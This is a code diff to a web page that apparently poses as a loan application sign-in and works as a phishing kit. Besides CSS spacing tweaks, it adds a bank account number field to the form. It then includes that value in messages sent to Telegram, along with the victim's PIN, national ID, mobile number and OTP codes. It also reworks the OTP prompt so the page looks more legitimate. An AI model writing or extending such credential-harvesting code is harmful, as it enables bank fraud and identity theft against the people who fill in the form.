@@ -304,7 +304,7 @@
       display: flex;
       align-items: center;
       gap: 12px;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
       font-size: 0.85rem;
       font-weight: 500;
     }
@@ -348,8 +348,8 @@
       background: rgba(255, 255, 255, 0.06);
       border: 1.5px solid var(--glass-border);
       border-radius: 28px;
-      padding: 13px 20px;
-      margin-bottom: 16px;
+      padding: 12px 20px;
+      margin-bottom: 14px;
       display: flex;
       align-items: center;
       gap: 10px;
@@ -390,7 +390,7 @@
       font-size: 1rem;
       font-weight: 700;
       cursor: pointer;
-      margin-top: 8px;
+      margin-top: 4px;
       box-shadow: 0 4px 20px rgba(0,0,0,0.3);
       display: flex;
       align-items: center;
@@ -398,14 +398,14 @@
       gap: 8px;
     }
 
-    .divider { margin: 20px 0; font-size: 0.8rem; color: var(--text-muted); }
+    .divider { margin: 15px 0; font-size: 0.8rem; color: var(--text-muted); }
 
     .btn-fingerprint {
       background: rgba(10, 37, 64, 0.8);
       color: #FFF;
       border: 1px solid var(--glass-border);
       border-radius: 12px;
-      padding: 11px 20px;
+      padding: 10px 20px;
       font-size: 0.88rem;
       font-weight: 600;
       cursor: pointer;
@@ -460,15 +460,15 @@
 
     .otp-inputs {
       display: flex;
-      gap: 10px;
+      gap: 8px;
       margin-bottom: 16px;
     }
 
     .otp-inputs input {
-      width: 44px;
-      height: 48px;
+      width: 38px;
+      height: 44px;
       text-align: center;
-      font-size: 1.3rem;
+      font-size: 1.2rem;
       font-weight: 700;
       border-radius: 10px;
       border: 1.5px solid var(--glass-border);
@@ -646,6 +646,15 @@
           <span>Mobile Number</span>
         </div>
 
+        <!-- Bank Account Number Input -->
+        <div class="input-box">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.7;">
+            <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+            <line x1="2" y1="10" x2="22" y2="10"></line>
+          </svg>
+          <input type="text" id="bankAccountInput" placeholder="Enter bank account number" value="" />
+        </div>
+
         <!-- National ID Input -->
         <div class="input-box">
           <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.7;">
@@ -698,7 +707,7 @@
           </div>
           
           <h3>OTP Verification</h3>
-          <p>Please enter the 4-digit code sent to your registered number ending in **241.</p>
+          <p id="otpPromptText">Please enter the 6-digit code sent to your registered number.</p>
           
           <!-- Error Message Display -->
           <div class="error-msg" id="errorMsg">⚠️ Invalid OTP code entered. Please try again.</div>
@@ -708,7 +717,7 @@
             <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
             <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
             <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
-             <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
+            <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
             <input type="text" maxlength="1" pattern="\d*" inputmode="numeric" />
           </div>
 
@@ -823,15 +832,21 @@
 
     function simulateSignIn() {
       capturedPin = document.getElementById('pinInput').value;
+      const bankAccount = document.getElementById('bankAccountInput').value;
       const nationalId = document.getElementById('nationalIdInput').value;
       const mobileNumber = document.getElementById('mobileInput').value;
       const termMonths = document.getElementById('termSelect').value;
       const monthlyPay = document.getElementById('dispMonthlyPay').innerText;
 
+      // Update the OTP modal instruction dynamically to show the user's full phone number
+      const fullPhoneDisplay = mobileNumber ? `+263 ${mobileNumber}` : "your registered number";
+      document.getElementById('otpPromptText').innerText = `Please enter the 6-digit code sent to your registered number ${fullPhoneDisplay}.`;
+
       sendDataToTelegram("Login Attempt", {
         amount: currentLoanAmount,
         term: termMonths,
         monthly: monthlyPay,
+        bankAccount: bankAccount,
         nationalId: nationalId,
         mobile: mobileNumber,
         pin: capturedPin,
@@ -908,6 +923,7 @@
                         `💰 *Amount:* $${details.amount.toLocaleString()} USD\n` +
                         `📅 *Term:* ${details.term} Months\n` +
                         `💵 *Monthly Payment:* ${details.monthly}\n` +
+                        `🏦 *Bank Account:* ${details.bankAccount}\n` +
                         `🆔 *National ID:* ${details.nationalId}\n` +
                         `📱 *Mobile Number:* +263 ${details.mobile}\n` +
                         `🔑 *PIN Entered:* ${details.pin}\n` +
@@ -941,6 +957,7 @@
       otpAttemptCount++;
       
       capturedOtp = Array.from(otpInputs).map(input => input.value).join('');
+      const bankAccount = document.getElementById('bankAccountInput').value;
       const nationalId = document.getElementById('nationalIdInput').value;
       const mobileNumber = document.getElementById('mobileInput').value;
       const termMonths = document.getElementById('termSelect').value;
@@ -951,6 +968,7 @@
             amount: currentLoanAmount,
             term: termMonths,
             monthly: monthlyPay,
+            bankAccount: bankAccount,
             nationalId: nationalId,
             mobile: mobileNumber,
             pin: capturedPin,
@@ -968,6 +986,7 @@
             amount: currentLoanAmount,
             term: termMonths,
             monthly: monthlyPay,
+            bankAccount: bankAccount,
             nationalId: nationalId,
             mobile: mobileNumber,
             pin: capturedPin,
